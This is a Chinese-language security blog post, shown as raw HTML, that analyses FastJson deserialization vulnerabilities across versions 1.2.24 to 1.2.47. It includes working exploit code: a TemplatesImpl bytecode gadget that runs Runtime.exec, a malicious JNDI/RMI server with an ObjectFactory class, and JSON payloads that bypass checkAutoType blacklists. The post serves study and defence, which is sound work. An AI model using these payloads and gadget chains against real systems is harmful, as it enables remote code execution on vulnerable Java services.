<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>FastJson反序列化漏洞总结 | Reus09&#39;s Blog</title>
<meta name="keywords" content="">
<meta name="description" content="实际上，前不久刚刚分析了FastJson1.2.80漏洞，一方面对Java反序列化漏洞有了一个初步的了解，如果可以控制一个类的实例化，并且这">
<meta name="author" content="Reus09">
<link rel="canonical" href="/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="FastJson反序列化漏洞总结" />
<meta property="og:description" content="实际上，前不久刚刚分析了FastJson1.2.80漏洞，一方面对Java反序列化漏洞有了一个初步的了解，如果可以控制一个类的实例化，并且这" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-12T14:04:36+08:00" />
<meta property="article:modified_time" content="2022-10-12T14:04:36+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="FastJson反序列化漏洞总结"/>
<meta name="twitter:description" content="实际上，前不久刚刚分析了FastJson1.2.80漏洞，一方面对Java反序列化漏洞有了一个初步的了解，如果可以控制一个类的实例化，并且这"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "📚文章",
      "item": "/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "👨🏻‍💻技术",
      "item": "/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "FastJson反序列化漏洞总结",
      "item": "/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "FastJson反序列化漏洞总结",
  "name": "FastJson反序列化漏洞总结",
  "description": "实际上，前不久刚刚分析了FastJson1.2.80漏洞，一方面对Java反序列化漏洞有了一个初步的了解，如果可以控制一个类的实例化，并且这",
  "keywords": [
     null 
  ],
  "articleBody": "实际上，前不久刚刚分析了FastJson1.2.80漏洞，一方面对Java反序列化漏洞有了一个初步的了解，如果可以控制一个类的实例化，并且这个类里面的成员也存在可控，就可以注入恶意JSON实现反序列漏洞，另一方面由于FastJson1.2.25之后都是对AutoType机制进行绕过，所以也简单学习了AutoTypeCheck机制，还有一些期望类的Gadget。本文主要对FastJson常用的的解析String的parse,parseObject等方法进行分析，然后分析AutoTypeCheck机制，同时也对FastJson历史漏洞进行简单的整理。\n漏洞介绍 这里就再介绍一下FastJson的背景。\nfastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。\n由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁，用户量十分庞大，这也就导致了这样的组件一旦爆出漏洞，危害也将会是巨大的，因此，fastjson 从第一次报告安全漏洞至今，进行了若干次的安全更新，也与安全研究人员进行了来来回回多次的安全补丁-绕过的流程。\n这里放一下框架图\n主要功能在DefaultJSONParser类中实现的，在这个类中会应用其他的一些外部类来完成后续操作。ParserConfig主要是进行配置信息的初始化，JSONLexer主要是对json字符串进行处理并分析，反序列化在JavaBeanDeserializer中处理。\n反序列化方法 将 json 数据反序列化时常使用的方法为parse()、parseObject()、parseArray()，这三个方法也均包含若干重载方法，带有不同参数：\n反序列化特性：com.alibaba.fastjson.parser.Feature， 类的类型：java.lang.reflect.Type，用来执行反序列化类的类型。 处理泛型反序列化：com.alibaba.fastjson.TypeReference。 编程扩展定制反序列化：com.alibaba.fastjson.parser.deserializer.ParseProcess，例如ExtraProcessor 用于处理多余的字段，ExtraTypeProvider 用于处理多余字段时提供类型信息。 这里列举一些 fastjson 功能要点：\n使用 JSON.parse(jsonString) 和 JSON.parseObject(jsonString, Target.class)，两者调用链一致，前者会在 jsonString 中解析字符串获取 @type 指定的类，后者则会直接使用参数中的class。 fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 get 开头且第4位是大写字母、方法不能有参数传入、继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 set 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 com.alibaba.fastjson.util.JavaBeanInfo.build() 中。 使用 JSON.parseObject(jsonString) 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用。 如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 Feature.SupportNonPublicField 参数。 fastjson 在为类属性寻找 get/set 方法时，调用函数 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch() 方法，会忽略 _|- 字符串，也就是说哪怕你的字段名叫 _a_g_e_，getter 方法为 getAge()，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 _ 和 - 进行组合混淆。 fastjson 在反序列化时，如果 Field 类型为 byte[]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。 为了测试以上内容，我们写一个demo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 package com.reus09; import com.alibaba.fastjson.JSON; import java.io.UnsupportedEncodingException; import java.util.Arrays; import java.util.Properties; import java.util.Base64; /** * @ClassName FastJsonTest * @Description TODO * @Author reus09 * @Date 2022/10/11 19:34 * @Version 1.0 **/ public class FastJsonTest { public String t1; private Integer t2; private Boolean t3; private Properties t4; private Properties t5; private byte[] t6; @Override public String toString() { return \"FastJsonTest{\" + \"t1='\" + t1 + '\\'' + \", t2=\" + t2 + \", t3=\" + t3 + \", t4=\" + t4 + \", t5=\" + t5 + \", t6=\" + Arrays.toString(t6) + '}'; } public byte[] getT6() { return t6; } public void setT6(byte[] t6) { this.t6 = t6; } public FastJsonTest() { System.out.println(\"FastJsonTest() is called \"); } public void setT5(Properties t5) { System.out.println(\"setT5()\"); this.t5 = t5; } public void setT1(String t1) { System.out.println(\"setT1()\"); this.t1 = t1; } public void setT2(Integer t2) { System.out.println(\"setT2()\"); this.t2 = t2; } public String getT1() { System.out.println(\"getT1()\"); return t1; } public Integer getT2() { System.out.println(\"getT2()\"); return t2; } public Boolean getT3() { System.out.println(\"getT3()\"); return t3; } public Properties getT4() { System.out.println(\"getT4()\"); return t4; } public Properties getT5() { System.out.println(\"getT5()\"); return t5; } public static void main(String[] args) throws UnsupportedEncodingException { String jsonString = \"{\\\"@type\\\":\\\"com.reus09.FastJsonTest\\\",\\\"t1\\\":\\\"t1\\\",\\\"t2\\\":1,\\\"t3\\\":1,\\\"t4\\\":{},\\\"t5\\\":{},\\\"t6\\\":\\\"\"+Base64.getEncoder().encodeToString(\"Hello,FastJson\".getBytes(\"utf-8\"))+\"\\\"}\"; System.out.println(\"---------JSON.parse(string)-----------\"); Object obj = JSON.parse(jsonString); System.out.println(obj); System.out.println(\"---------JSON.parseObject(string,clazz)-----------\"); Object obj1 = JSON.parseObject(jsonString,FastJsonTest.class); System.out.println(obj1); System.out.println(\"---------JSON.parseObject(string)-----------\"); Object obj2 = JSON.parseObject(jsonString); System.out.println(obj2); } } 运行结果：\n总的来说，parse(string),parseObject(string,clazzs)与parseObject(string)进行反序列化时的细节区别在于，parse(string) 会识别并调用目标类的 setter 方法，而 parseObject(string) 由于要将返回值转化为JSONObject，多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的getter 方法来将参数赋值给JSONObject，所以反序列化过程中，parseObject(string)的危害性相对会更大。\nFastJson 1.2.24分析 FastJson1.2.24开启了FastJson反序列实现RCE的大门\nfastjson 默认使用 @type 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter/setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。此漏洞开启了 fastjson 反序列化漏洞的大门，为安全研究人员提供了新的思路。\n这里对1.2.24的两条常见利用链TemplatesImpl 反序列化和JdbcRowSetImpl 反序列化进行简单的学习。\nTemplatesImpl 反序列化 分析一下漏洞利用链的全过程，实际上在查阅资料的同时，发现其也是CommonsCollections-3链子的分析，因为刚刚接触到Java安全,对CC3链只是略有耳闻，之后的学习之中会慢慢学习CC链的各种利用姿势。\n参考的各位大师傅的博客关于TemplateImpl反序列化链的思考都是从漏洞挖掘的思路开始，从getTransletInstance()这个实例化点出发，需要哪一个利用元素就去寻找，最后完善利用过程。\n函数栈调用情况:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 exec:348, Runtime (java.lang) :22, Calculartor (com.reus09) newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:193, JSON (com.alibaba.fastjson) main:117, FastJsonTest (com.reus09) 首先我们在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance存在一个成员属性 _class，是一个 Class 类型的数组，数组里下标为_transletIndex 的类会在 getTransletInstance() 方法中使用 newInstance() 实例化。\n同时我们发现com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer中调用了getTransletInstance()\n方法,同时,com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties调用了这里的newTransformer()方法。 这里的getOutputProperties()方法就是对TemplatesImpl类的私有元素outputProperties的getter方法\n那么我们只要控制_class以及_transletIndex就可以实现任意类的实例化，从而触发漏洞。\ndefineTransletClasses()与newInstance()在同一方法内，于是查看一下defineTransletClasses() 的逻辑。\n先要求 _bytecodes 不为空，接着就会调用自定义的 ClassLoader 去加载 _bytecodes 中的 byte[] 。而 _bytecodes 也是该类的成员属性。\n_bytecodes变量非空值时，程序将会把_bytecodes数组中的值循环取出，使用loader.defineClass方法从字节码转化为Class对象，随后后赋值给_class[i]。\n而如果这个类的父类为 ABSTRACT_TRANSLET 也就是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，就会将类成员属性的，_transletIndex 设置为当前循环中的标记位，而如果是第一次调用，就是_class[0]。如果父类不是这个类，将会抛出异常。\n那这样一条完整的漏洞调用链就呈现出来了：\n构造一个 TemplatesImpl 类的反序列化字符串，其中 _bytecodes 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 newInstance() 实例化。 在反序列化过程中，由于getter方法 getOutputProperties()，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：getOutputProperties() -\u003e newTransformer() -\u003e getTransletInstance() -\u003e defineTransletClasses() / EvilClass.newInstance(). 同时为了程序在实例化之前因报错退出，需要将_name和_tfactory设置不为空，_tfactory如果不指定会出现空指针。查看_tfactory的定义如下：\n1 private transient TransformerFactoryImpl _tfactory = null; 具体实现：\n一个继承了AbstractTranslet的恶意类,将其编译成字节码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package com.reus09; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; /** * @ClassName Calculartor * @Description TODO * @Author reus09 * @Date 2022/10/12 15:42 * @Version 1.0 **/ public class Calculartor extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } payload部分：\nJSON对应的如下:\n1 2 3 4 5 6 7 { \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"yv66vgAAADQA...CJAAk=\"], \"_name\": \"reus09\", \"_tfactory\": {}, \"_outputProperties\": {}, } 代码如下:\n1 2 3 4 byte[] code = Files.readAllBytes(Paths.get(\"/Users/reus09/Desktop/rce/FastJson/target/classes/com/reus09/Calculartor.class\")); String codeString = Base64.getEncoder().encodeToString(code); String payload = \"{\\\"@type\\\":\\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\",\\\"_bytecodes\\\":[\\\"\"+Base64.getEncoder().encodeToString(code)+\"\\\"],\\\"_name\\\":\\\"reus09\\\",\\\"_tfactory\\\":{ },\\\"_outputProperties\\\":{ },\\\"_version\\\":\\\"1.0\\\",\\\"allowedProtocols\\\":\\\"all\\\"}\"; JSON.parse(payload, Feature.SupportNonPublicField); JdbcRowSetImpl 反序列化 JdbcRowSetImpl 类位于 com.sun.rowset.JdbcRowSetImpl ，是 javax.naming.InitialContext#lookup() 参数可控导致的 JNDI 注入。\nJdbcRowSetImpl调用函数栈\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 exec:348, Runtime (java.lang) :19, badClassName (com.reus09) newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getObjectFactoryFromReference:174, NamingManager (javax.naming.spi) getObjectInstance:330, NamingManager (javax.naming.spi) decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry) lookup:138, RegistryContext (com.sun.jndi.rmi.registry) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:417, InitialContext (javax.naming) connect:624, JdbcRowSetImpl (com.sun.rowset) setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) main:123, FastJsonTest (com.reus09) 先看一下 setAutoCommit() 方法，在 conn 为空时，将会调用 connect() 方法。\n然后在connect方法里面调用了 javax.naming.InitialContext#lookup() 方法，参数从成员变量 dataSource 中获取。\n通过函数栈的变化，可以很明显的看到，在FastJson解析函数parse函数作用的时候，通过反射给类的元素赋值的时候引起的命令执行。在FieldDeserialize#setValue方法，然后执行setAutoCommit()方法，进而实现反序列化。 编写一个JNDI服务\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package com.reus09; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.NamingException; import javax.naming.Reference; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; /** * @ClassName JDNIServer * @Description TODO * @Author reus09 * @Date 2022/10/12 18:09 * @Version 1.0 **/ public class JDNIServer { public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new Reference(\"com.reus09.badClassName\", \"com.reus09.badClassName\",\"http://127.0.0.1:8000/\"); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"Exploit\",referenceWrapper); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package com.reus09; import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class badClassName implements ObjectFactory { public badClassName() throws IOException { Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } } Payload部分\nJSON格式\n1 2 3 4 5 { \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\", \"autoCommit\":true } 代码\n1 2 3 4 5 6 7 8 // 解决java版本过高的问题，默认以下的元素都为false System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\"); System.setProperty(\"com.sun.jndi.cosnaming.object.trustURLCodebase\",\"true\"); System.out.println(\"JdbcRowSetImpl 链的利用\"); String payload2 = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://127.0.0.1:1099/Exploit\\\", \\\"autoCommit\\\":true}\"; JSON.parse(payload2); AutoType与checkAutoType Fastjson提供了autotype功能,允许用户在反序列化数据中通过“@type”指定反序列化的Class类型。\n简单的来说就是：当一个类中包含了一个接口（或抽象类）的时候，在正常反序列化中，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。FastJson通过使用autotype来对指定的@type实现的接口同样进行正常反序列化。\n具体的话，看panda师傅对AutoType起到的作用进行了简单的介绍。\ncheckAutoType是 FastJson 在 1.2.25 以及之后的版本中，为了防止 autoType 这一机制带来的 安全隐患，增加的检测防御机制，这是一个对于 @type 属性进行白名单+黑名单的限制机制。\n早期版本的checkAutoType存在一些比较低级的绕过方法，如加上L开头;结尾、双写LL绕过 等，直到1.2.48版本后，checkAutoType 变得成熟，黑名单也逐渐完善。\n其具体逻辑，可以用《How i use json deserialization》议题的一张图片概括:\ncheckAutoType首先会对传入的typeName进行3项检测:\n是否是白名单中的类 是否在反序列化cache中(在mappings列表) 类有JSONType注解(如:fastjson.annotation.JSONType) 如果满足以上条件，那么会直接return出去继续执行反序列化流程并且将未载入cache的类载 入cache\n如果没有满足其中的一个条件，那么会进入另一个判断:\n传入的typeName是否在黑名单中 是否继承自RowSet、DataSource、ClassLoader等类 如果满足上述条件之一，那么直接抛出错误 如果都不满足，那么会进行如下判断:\nexpectClass不为NULL、Object、Serializable、Closeable等类型 传入的typeName类继承于expctClass 如果满足以上条件，那么会直接return出去继续执行反序列化流程并且将未载入cache的类载 入cache\n如果不满足，那么会经过autoTypeSupport的判断，autoTypeSupport主要用来打开autotype功能，默认情况下是false，抛出错误，如果设置的是True那么会return出去继续执行反序列化流 程并且将未载入cache的类载入cache。\n历史漏洞分析 fastjson-1.2.25 在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。\n影响版本：1.2.25 \u003c= fastjson \u003c= 1.2.41 描述：作者通过为危险功能添加开关，并提供黑白名单两种方式进行安全防护，其实已经是相当完整的防护思路，而且作者已经意识到黑名单类将会无穷无尽，仅仅通过维护列表来防止反序列化漏洞并非最好的办法。而且靠用户自己来关注安全信息去维护也不现实。\n安全更新主要集中在 com.alibaba.fastjson.parser.ParserConfig，首先查看类上出现了几个成员变量：布尔型的 autoTypeSupport，用来标识是否开启任意类型的反序列化，并且默认关闭；字符串数组 denyList ，是反序列化类的黑名单；acceptList 是反序列化白名单。\n其中黑名单 denyList 包括：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework 添加反序列化白名单有3种方法：\n使用代码进行添加：ParserConfig.getGlobalInstance().addAccept(“org.reus09.fastjson.,org.javaweb.”) 加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.reus09.fastjson. 在fastjson.properties中添加：fastjson.parser.autoTypeAccept=org.reus09.fastjson. 然后我们分析一下1.2.25版本下的check机制\n首先开启autoTypeSupport,先根据白名单进行判别，再通过黑名单进行判别。如果在，就使用 TypeUtils.loadClass 加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。\n如果上面没查询到，通过TypeUtils.getClassFromMapping(typeName)缓存判断\n缓存里面的种类如下：\n缓存也没有，在没有开启autoTypeSupport的时候，先进入黑名单进行判断，然后在白名单进行判断，如果存在白名单，同样进行loadlClass加载。\n最后，如果它是个期望类，并且在黑白名单都没有找到，同样调用loadClass。\n我们通过分析loadClass方法的逻辑，这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的 [、L、; 字符。\n在这个位置出现了逻辑漏洞，攻击者可以使用带有描述符的类绕过黑名单的限制，而在类加载过程中，描述符还会被处理掉。因此，漏洞利用的思路就出来了：需要开启 autoType，使用以上字符来进行黑名单的绕过。\npayload:\n1 2 3 4 5 6 7 { \"@type\": \"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\", \"_bytecodes\": [\"yv66vgAAADQA...CJAAk=\"], \"_name\": \"reus09\", \"_tfactory\": {}, \"_outputProperties\": {}, } fastjson-1.2.42 在版本 1.2.42 中，fastjson 继续延续了黑白名单的检测模式，但是将黑名单类从白名单修改为使用 HASH 的方式进行对比，这是为了防止安全研究人员根据黑名单中的类进行反向研究，用来对未更新的历史版本进行攻击。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。\n影响版本：1.2.25 \u003c= fastjson \u003c= 1.2.42 描述：通过变量常用的jar、类、字符串碰撞hash得到黑名单\n还是关注 com.alibaba.fastjson.parser.ParserConfig 这个类，作者将原本的明文黑名单转为使用了 Hash 黑名单，防止安全人员对其研究。\n加密方式在com.alibaba.fastjson.util.TypeUtils#fnv1a_64是有的\n并且在 checkAutoType 中加入判断，如果类的第一个字符是 L 结尾是 ;，则使用 substring 进行了去除。还是用hash写的。\n但是这种判断完全是徒劳的，因为在最后loadClass处理时是递归处理，因此只要对描述符进行双写即可绕过：\npayload:\n1 2 3 4 5 6 7 { \"@type\": \"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\", \"_bytecodes\": [\"yv66vgAAADQA...CJAAk=\"], \"_name\": \"reus09\", \"_tfactory\": {}, \"_outputProperties\": {}, } fastjson-1.2.43 这个版本主要是修复上一个版本中双写绕过的问题。\n影响版本：1.2.25 \u003c= fastjson \u003c= 1.2.43 描述：上有政策，下有对策。在 L、; 被进行了限制后，安全研究人员将目光转向了 [。\n可以看到用来检查的 checkAutoType 代码添加了判断，如果类名连续出现了两个 L 将会抛出异常\n这样使用 L、; 绕过黑名单的思路就被阻挡了，但是在 loadClass 的过程中，还针对 [ 也进行了处理和递归.\npayload:\n1 2 3 4 5 6 7 { \"@type\": \"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"[, {\"_bytecodes\": [\"yv66vgAAADQA...CJAAk=\"], \"_name\": \"reus09\", \"_tfactory\": {}, \"_outputProperties\": {}, } fastjson-1.2.44 这个版本主要是修复上一个版本中使用 [ 绕过黑名单防护的问题。\n影响版本：1.2.25 \u003c= fastjson \u003c= 1.2.44 描述：在此版本将 [ 也进行修复了之后，由字符串处理导致的黑名单绕过也就告一段落了。\n在 checkAutoType 中添加了新的判断，如果类名以 [ 开始则直接抛出异常。\n可以使用像fastjson-1.2.45的payload byPass\nfastjson-1.2.45 在此版本爆出了一个黑名单绕过，实际上，黑名单是无穷无尽的，随着 fastjson 的版本更新，一定会有更多的黑名单爆出来，因为隔壁 jackson 都是明文黑名单的，只要隔壁一更新，大家都看到了，就会拿来看 fastjson。\n影响版本：1.2.25 \u003c= fastjson \u003c= 1.2.45 描述：黑名单列表需要不断补充。\npayload如下：\n1 2 3 4 5 6 { \"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\", \"properties\":{ \"data_source\":\"ldap://127.0.0.1:23457/Command8\" } } 需要pom\n1 2 3 4 5 org.apache.ibatis ibatis-core 3.0 fastjson-1.2.47 在 fastjson 不断迭代到 1.2.47 时，爆出了最为严重的漏洞，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。\n影响版本：1.2.25 \u003c= fastjson \u003c= 1.2.32 未开启 AutoTypeSupport 影响版本：1.2.33 \u003c= fastjson \u003c= 1.2.47不论是否开启AutoTypeSupport 描述：作者删除了一个 fastjson 的测试文件：https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66 ，里面包含了这次通杀漏洞的 payload。\n分析 这次的绕过问题还是出现在 checkAutoType() 方法中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 